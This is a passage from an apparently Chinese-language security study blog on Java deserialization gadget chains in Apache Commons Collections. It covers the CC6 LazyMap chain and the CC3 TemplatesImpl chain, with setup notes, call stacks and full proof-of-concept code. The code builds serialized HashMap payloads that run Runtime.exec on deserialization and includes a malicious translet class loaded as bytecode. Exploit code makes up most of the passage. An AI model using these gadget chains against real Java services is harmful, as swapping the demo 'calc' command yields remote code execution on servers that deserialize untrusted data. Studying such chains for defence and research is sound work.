class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 6. base64编码 * * * * * */</span></span><br><span class="line">            System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CC6-LazyMap"><a href="#CC6-LazyMap" class="headerlink" title="CC6_LazyMap"></a>CC6_LazyMap</h2><ul><li>env<ul><li><p>可高版本JDK</p></li><li><p>maven: commons-collections:3.2.1 [<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1]">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1]</a> 和 commons-collections:3.1 [<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]</a></p><ul><li>下载后没有反应需要reload以下maven project</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ol><li><p>利用到的点: TiedMapEntry, Transformers, LazyMap</p></li><li><p>CC6_LazyMap核心思想</p><ol><li><strong>入口点</strong>: HashMap的readObject中会有hash()，只要有一个key为TiedMapEntry的就可以作为后续链子的入口点</li><li><strong>触发点</strong>: LazyMap.get()一个没有defined的key会自动触发内部transformer.transform()</li><li>(下列和TransformedMap一致)</li><li><strong>调用目标方法</strong>: InvokerTransformer</li><li><strong>获取Runtime对象</strong>: ConstantTransformer</li><li><strong>链式调用</strong>: ChainedTransformer组成的TransformerChain，这里的transform()是比较特殊的，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，而不是一直在一个对象上调用</li><li>详细内容见<a href="/_posts/Java%E5%AE%89%E5%85%A85(5)_CC6.md">Java安全5(5)_CC6</a></li></ol></li><li><p>Gadget Chain: 调用栈顺序</p><ol><li>CC6_LazyMap: 基于CC1来的下半段+TiedMapEntry与hash的结合</li><li>查找技巧，idea中方法gd可以查看全局调用到的部分(向前查找)</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain</span></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">    org.apache.commons.collections.functors.ConstantTransformer.transform()</span><br><span class="line">        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">            org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                        java.util.HashMap.hash()</span><br><span class="line">                            java.util.HashMap.readObject()</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p>poc</p><ol><li>使用反射设置payload是防止在本地执行了命令</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6_LazyMap</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    ,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;kc1zs4&quot;</span>) <span class="comment">// 隐藏足迹</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. payload条件1: LazyMap和触发点 * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;placeholder&quot;</span>));    <span class="comment">// 防止触发</span></span><br><span class="line">            <span class="comment">// lazyMap.put(&quot;same&quot;, &quot;anything&quot;);</span></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;same&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">deserMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            deserMap.put(triggerObj, <span class="string">&quot;same&quot;</span>);</span><br><span class="line">            lazyMap.remove(<span class="string">&quot;same&quot;</span>);</span><br><span class="line">            <span class="comment">// 直接deserMap.put的话会hash触发一次，如果map.containsKey(key) == false会自动添加</span></span><br><span class="line">            <span class="comment">// 可以看Java安全5(5)_CC6中的Q讲解</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 反射加入payload * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(lazyMap,payload);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(deserMap);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. base64编码 * * * * * */</span></span><br><span class="line">            System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CC3-TemplatesImpl"><a href="#CC3-TemplatesImpl" class="headerlink" title="CC3_TemplatesImpl"></a>CC3_TemplatesImpl</h2><ul><li>env<ul><li><p>jdk &lt; 8u71</p></li><li><p>maven: commons-collections:3.1 [<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1]</a></p><ul><li>下载后没有反应需要reload以下maven project</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ol><li><p>利用到的点: TemplatesImpl, InstantiateTransformer, AnnotationInvocationHandler, TrAXFilter</p></li><li><p>CC3_TemplatesImpl的核心要点</p><ol><li><strong>入口点</strong>: HashMap的readObject中会有hash()，只要有一个key为TiedMapEntry的就可以作为后续链子的入口点</li><li><strong>!!!触发点</strong>: 其实就是LazyMap的链子在最后ChainTransformer的transform()处用了InstantiateTransformer，并且是通过TrAXFilter类构造函数调用到TemplatesImpl内部重写(这里只是简单包装)的defineClass()来加载Runtime载体恶意类而已</li><li><strong>调用目标方法</strong>: TemplatesImpl.defineTransletClasses()和newInstance() &lt;- TemplatesImpl.getTransletInstance() &lt;- TemplatesImpl.newTransformer() &lt;- TrAXFilter(Templates templates)</li><li><strong>获取Runtime对象</strong>: 恶意类做载体，在构造函数调用</li><li><strong>链式调用</strong>: ChainedTransformer组成的TransformerChain，这里的transform()是比较特殊的，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，而不是一直在一个对象上调用</li></ol></li><li><p>Gadget Chain: 调用栈顺序</p><ol><li>基本思路和CC6_LazyMap一致，只是这里的触发点是TemplatesImpl的newTransformer()方法</li><li>CC6_LazyMap上半段&#x2F;CC1_LazyMap+TemplatesImpl与TrAXFilter触发点</li><li>CC3多出来的点主要是在于调用处: TemplatesImpl和TrAXFilter都是jdk自带的类，一个sink点</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**Gadget Chain</span></span><br><span class="line"><span class="comment"> * 可以分为两端</span></span><br><span class="line"><span class="comment"> * 前半段: LazyMap</span></span><br><span class="line"><span class="comment"> *    ChainedTransformer.transform() &lt;- LazyMap.get() &lt;- TiedMapEntry.getValue() &lt;- TiedMapEntry.hashCode() &lt;- HashMap.hash() &lt;- HashMap.readObject()</span></span><br><span class="line"><span class="comment"> * 后半段: TemplatesImpl</span></span><br><span class="line"><span class="comment"> *      TemplatesImpl.defineTransletClasses()和newInstance() &lt;- TemplatesImpl.getTransletInstance() &lt;- TemplatesImpl.newTransformer() &lt;- TrAXFilter(Templates templates) &lt;- InstantiateTransformer.transform() &lt;- ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最上层是自己的恶意类TemplatesImplEvil.java的构造函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">    com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses()</span><br><span class="line">&#125; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance()</span><br><span class="line">    com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()</span><br><span class="line">        com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter(Templates templates)    <span class="comment">// 构造函数</span></span><br><span class="line">            org.apache.commons.collections.functors.InstantiateTransformer.transform()</span><br><span class="line">                org.apache.commons.collections.functors.ConstantTransformer.transform()</span><br><span class="line">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                                    java.util.HashMap.hash()</span><br><span class="line">                                        java.util.HashMap.readObject()</span><br></pre></td></tr></table></figure></li><li><p>poc</p><ol><li>TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类<ol><li>加载的字节码为一个恶意类，且需要是AbstractTranslet的子类，并且通过对象实例化触发恶意命令 -&gt; 使用构造函数</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TemplatesImplEvil.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplEvil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplEvil</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CC3_TemplatesImpl.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.nio.file.Files.readAllBytes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. payload与反射设置triggerObj * * * * * */</span></span><br><span class="line">            <span class="type">byte</span>[] payload = Base64.getDecoder().decode(getRCE());</span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payload&#125;);</span><br><span class="line">            setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;kc1zs4&quot;</span>);</span><br><span class="line">            Transformer[] fakeGadget = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">            Transformer[] Gadget = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeGadget);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. payload条件1: LazyMap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;same&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            expMap.put(tiedMapEntry, <span class="string">&quot;same&quot;</span>);</span><br><span class="line">            lazyMap.remove(<span class="string">&quot;same&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 反射设置TransformerGadget * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(chainedTransformer, Gadget);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 模拟序列化和反序列化 * * * * * */</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = serialize(expMap);</span><br><span class="line">            System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">            unserialize(bytes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span 